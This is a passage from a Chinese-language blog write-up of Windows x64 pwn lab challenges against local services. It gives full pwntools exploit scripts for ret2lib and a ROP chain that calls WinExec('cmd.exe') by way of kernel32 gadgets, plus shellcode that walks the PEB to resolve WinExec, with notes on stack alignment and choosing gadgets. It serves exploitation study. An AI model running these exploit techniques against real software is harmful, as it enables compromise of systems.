+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">r =remote(&quot;127.0.0.1&quot;, 56002)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;Main:&quot;)</span><br><span class="line"></span><br><span class="line">main_address = int(r.recvline()[:-2], 16)</span><br><span class="line">log.info(&quot;main address is 0x%x&quot; %main_address)</span><br><span class="line"></span><br><span class="line">binbase = main_address + - 0x10f0</span><br><span class="line"></span><br><span class="line">pop_rcx_ret = binbase + 0x1000 + 0x54</span><br><span class="line">Name = binbase + 0x30b0</span><br><span class="line"></span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line"></span><br><span class="line">iat = binbase + 0x2000</span><br><span class="line"></span><br><span class="line">log.info(&quot;IAT is 0x%x&quot; %iat)</span><br><span class="line"></span><br><span class="line">RtlLookupFunctionEntry_iat = iat + 0x58</span><br><span class="line">log.info(&quot;RtlLookupFunctionEntry_iat is 0x%x&quot;, RtlLookupFunctionEntry_iat)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;Name:&quot;)</span><br><span class="line">r.sendline(&quot;cmd.exe\x00&quot;)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line"></span><br><span class="line">r.send(hex(RtlLookupFunctionEntry_iat))</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line"></span><br><span class="line">RtlLookupFunctionEntry = int(r.recvline()[:-1], 16)</span><br><span class="line"></span><br><span class="line">log.info(&quot;RtlLookupFunctionEntry is 0x%x&quot;, RtlLookupFunctionEntry)</span><br><span class="line"></span><br><span class="line">RtlLookupFunctionEntry_offset = 0x1c340</span><br><span class="line"></span><br><span class="line">kernel_base = RtlLookupFunctionEntry - RtlLookupFunctionEntry_offset</span><br><span class="line"></span><br><span class="line">log.info(&quot;kernel_base is 0x%x&quot;, kernel_base)</span><br><span class="line"></span><br><span class="line">winexec = kernel_base + 0x5e670</span><br><span class="line"></span><br><span class="line">log.info(&quot;winexec is 0x%x&quot;, winexec)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;me :&quot;)</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*264 + p64(pop_rcx_ret) + p64(Name)  + p64(winexec)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>結果噴了一個 <code>xmm</code> 的error</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_22.png" alt=""></p>
+<p>這個在 windows 和 Linux 都會見到，主要是記憶體對齊問題</p>
+<p>有時候構 <code>stack migration</code> 也會遇到，這時候就多放幾個 <code>ret</code> 就好了</p>
+<p>反正多放他也只是往下 ret 不會怎樣</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">r =remote(&quot;127.0.0.1&quot;, 56002)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;Main:&quot;)</span><br><span class="line"></span><br><span class="line">main_address = int(r.recvline()[:-2], 16)</span><br><span class="line">log.info(&quot;main address is 0x%x&quot; %main_address)</span><br><span class="line"></span><br><span class="line">binbase = main_address + - 0x10f0</span><br><span class="line"></span><br><span class="line">pop_rcx_ret = binbase + 0x1000 + 0x54</span><br><span class="line">Name = binbase + 0x30b0</span><br><span class="line"></span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line"></span><br><span class="line">iat = binbase + 0x2000</span><br><span class="line"></span><br><span class="line">log.info(&quot;IAT is 0x%x&quot; %iat)</span><br><span class="line"></span><br><span class="line">RtlLookupFunctionEntry_iat = iat + 0x58</span><br><span class="line">log.info(&quot;RtlLookupFunctionEntry_iat is 0x%x&quot;, RtlLookupFunctionEntry_iat)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;Name:&quot;)</span><br><span class="line">r.sendline(&quot;cmd.exe\x00&quot;)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line"></span><br><span class="line">r.send(hex(RtlLookupFunctionEntry_iat))</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;:&quot;)</span><br><span class="line"></span><br><span class="line">RtlLookupFunctionEntry = int(r.recvline()[:-1], 16)</span><br><span class="line"></span><br><span class="line">log.info(&quot;RtlLookupFunctionEntry is 0x%x&quot;, RtlLookupFunctionEntry)</span><br><span class="line"></span><br><span class="line">RtlLookupFunctionEntry_offset = 0x1c340</span><br><span class="line"></span><br><span class="line">kernel_base = RtlLookupFunctionEntry - RtlLookupFunctionEntry_offset</span><br><span class="line"></span><br><span class="line">log.info(&quot;kernel_base is 0x%x&quot;, kernel_base)</span><br><span class="line"></span><br><span class="line">winexec = kernel_base + 0x5e670</span><br><span class="line"></span><br><span class="line">log.info(&quot;winexec is 0x%x&quot;, winexec)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;me :&quot;)</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*264 + p64(pop_rcx_ret) + p64(Name) + p64(pop_rcx_ret+1)*3  + p64(winexec)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_23.png" alt=""></p>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ul>
+<li>透過玩轉 register 達成 <code>WinExec(&quot;cmd.exe&quot;)</code></li>
+<li>利用 <code>rp++</code> 尋找 gadget ( Windows 版的 ROPGadget)</li>
+<li>所需的 gadget 透過 kernel.dll 可以全部取得</li>
+<li>與 Ret2lib 不一樣的地方在於，這次不幫忙把 <code>cmd.exe</code> 放到 buffer 了，需要透過 gadget 達成這件事</li>
+</ul>
+<p>執行的樣子:</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_rop_1.png" alt=""></p>
+<p>一樣，透過 <code>main address</code> 和 <code>printf</code> 可以取得 <code>binbase</code> <code>IAT address</code> <code>kernel base</code><br> <img src="/img/2020/windows_pwn/windows_pwn_rop_2.png" alt=""></p>
+<p>透過 rp++ 尋找 gadget<br><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p>
+<p><code>rp-win-x64.exe --file=kernel32.dll --rop=8 &gt; gadget</code></p>
+<p>目前的想法是 -&gt; 透過 overflow 進行 leak 取得必要資訊 (binbase, kernel base)再跳回 main 進行第二次 exploit, 把 <code>cmd.exe</code> 進一個 buffer 裡面，然後把 buffer 空間 pop 到 <code>rcx</code> 再 call <code>WinExec</code></p>
+<p>為此我會以能動到 <code>rcx</code> register 的 gadget 為優先尋找，這樣之後就可以直接 call WinExec 不用再多一個 mov 的 gadget</p>
+<p>又 <code>cmd.exe\x00</code> 剛好 8 bytes, 所以以 <code>mov qword</code> 為主</p>
+<p>首先我們先找 <code>pop rcx; ret</code> 的位置，在call WinExec 之前一定要放這個</p>
+<p>然後可以很順利的在 binary 裡面找到</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_rop_3.png" alt=""></p>
+<p>再來是 <code>mov qword</code><br><img src="/img/2020/windows_pwn/windows_pwn_rop_4.png" alt=""><br>這邊選 <code>0x180040b07: mov qword [rcx], rax ; lea eax, dword [r10+r8] ; ret  ;  (1 found)</code></p>
+<p>保持幾個原則:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gadget 越短越好</span><br><span class="line">盡量不要動到 rsp (會影響到 pop 的值)</span><br><span class="line">動到的 register 越少越好</span><br></pre></td></tr></table></figure></p>
+<p>因為會需要控到 <code>rax</code> 所以我們還需要 <code>pop rax; ret</code></p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_rop_5.png" alt=""></p>
+<p>最後要找哪裡能讓我們寫，也就是 bss address, 這部分可以透過 PE Bear 搞定</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_rop_6.png" alt=""> </p>
+<p>或是用 windbg 的 <code>!address</code></p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_rop_7.png" alt=""></p>
+<p>最後附上 exploit code, 寫完已經四點了@@ 好累</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">r = remote(&quot;127.0.0.1&quot;, 56004)</span><br><span class="line">r.recvuntil(&quot;magic:&quot;)</span><br><span class="line">main = int(r.recvline()[:-1], 16)</span><br><span class="line">offset = 40</span><br><span class="line"></span><br><span class="line">log.info(&quot;main address is 0x%x&quot; %main)</span><br><span class="line"></span><br><span class="line">binbase = main - 0x1130</span><br><span class="line"></span><br><span class="line">iat = binbase + 0x2000</span><br><span class="line">pop_qword = 0x180040b07 # mov qword [rcx], rax ; lea eax, dword [r10+r8] ; ret  ;</span><br><span class="line"></span><br><span class="line">RtlCaptureContext_iat = iat + 0x40</span><br><span class="line">printf = binbase + 0x1060</span><br><span class="line">pop_rcx_ret = binbase + 0x1128</span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line">log.info(&quot;IAT is 0x%x&quot; %iat)</span><br><span class="line">log.info(&quot;RtlCaptureContext_iat is 0x%x&quot; %RtlCaptureContext_iat)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;t:&quot;)</span><br><span class="line"></span><br><span class="line">leak = b&quot;a&quot;.ljust(offset, b&quot;\x90&quot;) + p64(pop_rcx_ret) + p64(RtlCaptureContext_iat) + p64(printf) + p64(main)</span><br><span class="line"></span><br><span class="line">#raw_input()</span><br><span class="line"></span><br><span class="line">r.sendline(leak)</span><br><span class="line"></span><br><span class="line">RtlCaptureContext = u64(r.recvuntil(&quot;t:&quot;)[:6].ljust(8, b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">kernel_base = RtlCaptureContext - 0x00020b30</span><br><span class="line"></span><br><span class="line">log.info(&quot;RtlCaptureContext is 0x%x&quot; %RtlCaptureContext)</span><br><span class="line">log.info(&quot;kernel base is 0x%x&quot; %kernel_base)</span><br><span class="line"></span><br><span class="line">winexec = kernel_base + 0x0005e670</span><br><span class="line">pop_qword = kernel_base + 0x40b07</span><br><span class="line">pop_rax_ret = kernel_base + 0x1b111</span><br><span class="line"></span><br><span class="line">buf = binbase + 0x3000 + 0x800</span><br><span class="line"></span><br><span class="line">payload2 = b&quot;&quot;.ljust(offset, b&quot;\x90&quot;)</span><br><span class="line">payload2 += flat([pop_rcx_ret, buf, pop_rax_ret, b&quot;cmd.exe\x00&quot;, pop_qword, winexec])</span><br><span class="line">#raw_input()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>windows shellcode 不同於 Linux，超麻煩 XD<br>為此我還寫了一篇<a href="/2021/05/14/Windows10-x64-process-introduce/">文章</a><br>相關原理和就麻煩去看那篇吧</p>
+<p>這邊只貼 shellcode 因為題目也只是把我們餵給它的 shellcode 執行而已<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">sc = asm(&quot;&quot;&quot;</span><br><span class="line">    xor rdi,rdi</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    xor rcx,rcx</span><br><span class="line">    xor r8,r8</span><br><span class="line">    xor r9,r9</span><br><span class="line">    xor r10,r10</span><br><span class="line">    xor r11,r11</span><br><span class="line"></span><br><span class="line">    mov r10,0x%x</span><br><span class="line">    mov rdi,qword ptr gs:[0x60] #get peb</span><br><span class="line">    mov rdi,qword ptr [rdi+0x18] # get pebldr</span><br><span class="line">    mov rdi,qword ptr [rdi+0x20] # get inmemory order module list (binary)</span><br><span class="line">    mov rdi,qword ptr [rdi] # get inmemory order module list (ntdll)</span><br><span class="line">    mov rdi,qword ptr [rdi] # get inmemory order module list (kernel32)</span><br><span class="line">    mov rdi,qword ptr [rdi+0x20] # get baseaddress of kernel32</span><br><span class="line"></span><br><span class="line">    mov esi,dword ptr [rdi+0x3c] # get rva nt header of kernel32</span><br><span class="line">    lea rsi,qword ptr [rdi+rsi] # get nt header</span><br><span class="line">    mov esi,dword ptr [rsi+0x4+ 0x14 + 0x70] # get rva of datadirectory[0] (signature + fileheader + optionheader) </span><br><span class="line">    lea rsi,qword ptr [rsi+rdi] # export directory table</span><br><span class="line">    </span><br><span class="line">    mov r11d,dword ptr [rsi+0x18] # get number of name</span><br><span class="line">    mov r8d,dword ptr [rsi+0x20] # get rva of name pointer table</span><br><span class="line">    lea r8,qword ptr [rdi+r8] # get name pointer table</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">    xor r9,r9</span><br><span class="line">    mov r9d,dword ptr [r8+rcx*4]  # get rva of name pointer </span><br><span class="line">    mov r9,qword ptr [r9+rdi] # get name pointer</span><br><span class="line">    cmp r9,r10</span><br><span class="line">    je found</span><br><span class="line">    inc rcx</span><br><span class="line">    cmp rcx,r11  # if rcx &lt; number of names then jump to loop</span><br><span class="line">    jle loop</span><br><span class="line">    jmp notfound</span><br><span class="line"></span><br><span class="line">found :</span><br><span class="line">    xor r8,r8</span><br><span class="line">    mov r8d,dword ptr [rsi+0x24] # get rva of addressofnameordinals</span><br><span class="line">    lea r8,qword ptr [r8+rdi] # get ordinal table</span><br><span class="line">    mov dx,word ptr [r8+rcx*2] # get ordinal number of winexec</span><br><span class="line"></span><br><span class="line">    xor r8,r8</span><br><span class="line">    mov r8d,dword ptr [rsi+0x1c] # get rva of export address table</span><br><span class="line">    lea r8,qword ptr [r8+rdi] # get export address table</span><br><span class="line">    mov r8d,dword ptr [r8+rdx*4] # get rva of WinExec</span><br><span class="line">    lea r8,qword ptr [r8+rdi] # get address of WinExec</span><br><span class="line"></span><br><span class="line">    jmp cmd</span><br><span class="line"></span><br><span class="line">go :</span><br><span class="line">    pop rcx</span><br><span class="line">    sub rsp,0xf8</span><br><span class="line">    call r8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">notfound:</span><br><span class="line">    int3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd :</span><br><span class="line">    call go</span><br><span class="line">    .ascii &quot;cmd.exe&quot;</span><br><span class="line">    .byte 0</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot; % (u64(&quot;WinExec\x00&quot;)))</span><br></pre></td></tr></table></figure></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/sda06407" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2021 AStar<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
